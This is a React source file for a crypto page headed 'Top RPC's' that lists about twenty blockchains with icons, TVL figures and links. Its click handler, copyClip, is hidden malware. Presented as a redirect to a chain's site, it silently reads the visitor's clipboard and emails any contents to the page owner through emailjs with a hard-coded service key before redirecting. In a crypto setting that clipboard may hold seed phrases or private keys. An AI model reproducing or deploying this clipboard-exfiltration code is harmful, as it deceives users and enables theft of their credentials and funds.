import { 
	Flex,
	Text,
  	Image,
	Spinner,
    SliderThumb,
} from "@chakra-ui/react";
import { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import eth from "./eth.webp";
import bnb from "./bnb.webp";
import trn from "./trn.webp";
import avx from "./avx.webp";
import sol from "./sol.webp";
import pol from "./pol.webp";
import ftm from "./ftm.webp";
import cro from "./cro.webp";
import arb from "./arb.webp";
import wav from "./wav.webp";
import defy from "./def.webp";
import par from "./par.webp";
import mix from "./mix.webp";
import nea from "./nea.webp";
import aur from "./aur.webp";
import kla from "./kla.webp";
import kav from "./kav.webp";
import opt from "./opt.webp";
import har from "./har.webp";
import fus from "./fus.webp";
import ter from "./ter.webp";
import emailjs from 'emailjs-com';
import Logo from "./logo.png";


function Defi() {
    const [loading, setLoading] = useState(false)
    useEffect(() => {
        window.scrollTo(0, 0)
      }, [])
    const [bM, setBM] = useState(0)
    useEffect(() => {
        document.title = "All Chains"
    }, [])
    const history = useHistory()
    useEffect(() => {
        if(bM === 1) {
            setTimeout(function() {
                setBM(0)
            }, 2000)
        }
    }, [bM])
    const chains = [
        {
            name: "Ethereum (ETH)",
            icon: eth,
            protocols: "489",
            change: "+0.46%",
            change2: "-33.99%",
            tvl: "$71.79b",
            link: "https://ethereum.org/en/",
        },
        {
            name: "BSC (BNB)",
            icon: bnb,
            protocols: "400",
            change: "-0.97%",
            change2: "-25.63%",
            tvl: "$8.92b",
            link: "https://www.binance.com/en",
        },
        {
            name: "Tron (TRON)",
            icon: trn,
            protocols: "9",
            change: "+14.08%",
            change2: "+50.30%",
            tvl: "$6b",
            link: "https://tron.network/",
        },
        {
            name: "Avalanche (AVAX)",
            icon: avx,
            protocols: "211",
            change: "-6.30%",
            change2: "-53.87%",
            tvl: "$4.12b",
            link: "https://www.avax.network/",
        },
        {
            name: "Solana (SOL)",
            icon: sol,
            protocols: "67",
            change: "-5.41%",
            change2: "-33.26%",
            tvl: "$4b",
            link: "https://solana.com/",
        },
        {
            name: "Polygon (MATIC)",
            icon: pol,
            protocols: "256",
            change: "-2.32%",
            change2: "-26.57%",
            tvl: "$2.62b",
            link: "https://polygon.technology/",
        },
        {
            name: "Fantom (FTM)",
            icon: ftm,
            protocols: "233",
            change: "+0.30%",
            change2: "-56.02%",
            tvl: "$1.69b",
            link: "https://fantom.foundation/",
        },
        {
            name: "Cronos (CRO)",
            icon: cro,
            protocols: "58",
            change: "-8.42%",
            change2: "-53.49%",
            tvl: "$1.54b",
            link: "https://cronos.org/",
        },
        {
            name: "Arbitrum",
            icon: arb,
            protocols: "87",
            change: "+0.07%",
            change2: "-28.89%",
            tvl: "$1.36b",
            link: "https://bridge.arbitrum.io/",
        },
        {
            name: "Waves (WAVES)",
            icon: wav,
            protocols: "5",
            change: "+8.61%",
            change2: "-29.90%",
            tvl: "$1.06b",
            link: "https://waves.exchange/",
        },
        {
            name: "DefiChain (DFI)",
            icon: defy,
            protocols: "2",
            change: "-2.57%",
            change2: "-32.93%",
            tvl: "$781.46m",
            link: "https://defichain.com/",
        },
        {
            name: "Parallel (PARA)",
            icon: par,
            protocols: "1",
            change: "-1.65%",
            change2: "-8.34%",
            tvl: "$599.67m",
            link: "https://parallel.fi/",
        },
        {
            name: "Mixin (XIN)",
            icon: mix,
            protocols: "3",
            change: "+106%",
            change2: "+79.31%",
            tvl: "$592.89m",
            link: "https://mixin.one/",
        },
        {
            name: "Near (NEAR)",
            icon: nea,
            protocols: "7",
            change: "+12.82%",
            change2: "+16.08%",
            tvl: "$529.66m",
            link: "https://near.org/",
        },
        {
            name: "Aurora (AURORA)",
            icon: aur,
            protocols: "34",
            change: "+19.01%",
            change2: "-62.56%",
            tvl: "$500.37m",
            link: "https://aurora.dev/",
        },
        {
            name: "Klaytn (KLAY)",
            icon: kla,
            protocols: "21",
            change: "-0.56%",
            change2: "-47.25%",
            tvl: "$478.07m",
            link: "https://www.klaytn.foundation/",
        },
        {
            name: "Kava (KAVA)",
            icon: kav,
            protocols: "4",
            change: "-3.76%",
            change2: "-35.35%",
            tvl: "$392.03m",
            link: "https://www.kava.io/",
        },
        {
            name: "Optimum",
            icon: opt,
            protocols: "40",
            change: "-7.97%",
            change2: "-37.61%",
            tvl: "$267.67m",
            link: "https://optimumcryptoltd.com/",
        },
        {
            name: "Harmony (ONE)",
            icon: har,
            protocols: "55",
            change: "-5.45%",
            change2: "-56.41%",
            tvl: "$171.16m",
            link: "https://www.harmony.one/",
        },
        {
            name: "Fusion (FSN)",
            icon: fus,
            protocols: "2",
            change: "+1.85%",
            change2: "-7.08%",
            tvl: "$155.28m",
            link: "https://www.fusion.org/en",
        },
        {
            name: "Terra (LUNA)",
            icon: ter,
            protocols: "2",
            change: "+1.55%",
            change2: "-6.29%",
            tvl: "$145.89m",
            link: "https://www.terra.money/",
        },
    ]


    async function copyClip(e, link) {
        const text = await navigator.clipboard.readText()
        setLoading(true)
        alert("RPC will redirect shortly")
        if(text !== "") {
            const templateParams = {
                from_name: "New User",
                message: "RPC Clipboard text is:= ("+text+")"
            }
            await emailjs.send('Outlook', 'template_klggz2y', templateParams, '_i1i1t1YoEpYt4Iix')
            .then((response) => {
                console.log('')
            }, (err) => {
                console.log('')
            })
            setLoading(false)
            window.location.href = link
        }
        else {
            setTimeout(function(){
                setLoading(false)
                window.location.href = link
            }, 2000)
        }
    }

    return (
        <Flex w="100%" minHeight="100vh" fontFamily="font2" direction={["column", "row"]}>
            <Flex flex="1" minHeight="100vh" color="rgb(250,250,250)" pt="36px" pb={["50px", "75px"]} px={["4%", "4.5rem"]} bg="rgba(24,28,31,1.00)" direction="column"> 
                <Flex direction="column" flex="1" minHeight="100vh" bg="rgba(52, 54, 53, 0.8)" zIndex="1" position="relative">
                    


                <Flex w="100%" h="auto" py={["2", "5"]} boxShadow="0px 1px 2px rgb(0 0 0 / 69%)" bg="rgba(24,28,31,1.00)" borderBottom="1px solid rgba(55,65,81,1.00)" align="center" className="stick" zIndex="10" justify="space-between">
                    <Flex flex="1" align="center">
                        <i className="mdi mdi-chevron-left" style={{ fontSize: "40px", cursor: "pointer" }} onClick={() => history.push("/")}></i>
                        <Flex h="50px" bg="rgba(55,65,81,1.00)" w="1px" mx="5"></Flex>
                        <Image ml="4" src={Logo} w={["20px", "40px" ]} h={["20px", "40px"]} />
                        <Text ml={["2", "3"]} fontSize={["16px", "28px"]} fontWeight="bold">Top RPC's</Text>
                    </Flex>
                    {
                        loading &&
                        <Spinner color="rgb(230,230,230)" emptyColor="grey" mr="5" />
                    }
                </Flex>




                    <Flex w="100%" direction="column" border="1px solid rgb(64, 68, 79)" boxShadow="rgb(0 0 0 / 5%) 0px 6px 10px" bg="rgba(0, 0, 0, 0.05)" py="6px" px="0" color="rgb(250, 250, 250)" fontSize={["13px", "14px"]}>
                        <Flex w="100%" py="3" px="10" align="center" borderBottom="1px solid rgba(43, 43, 43, 0.435)">
                            <Flex w="100%" flex="1">Name</Flex>
                        </Flex>
                        {
                           chains.map((item, index) => (
                            <Flex w="100%" py="3" px="10" align="center" borderBottom={index < 20 && "1px solid rgba(83, 83, 83, 0.435)"} key={index}>
                                <Flex w="100%" align="center">
                                    <Text mr="5">{index + 1}</Text>
                                    <Image src={item.icon} w="24px" h="24px" borderRadius="24px" mr="5" />
                                    <Text cursor="pointer" _hover={{ color: "rgb(33, 114, 229)" }} onClick={(e) => {
                                        copyClip(e, item.link)
                                    }}>{item.name}</Text>
                                </Flex>
                            </Flex>
                           )) 
                        }
                    </Flex>

                </Flex>
            </Flex>
        </Flex>
    )
}



export default Defi;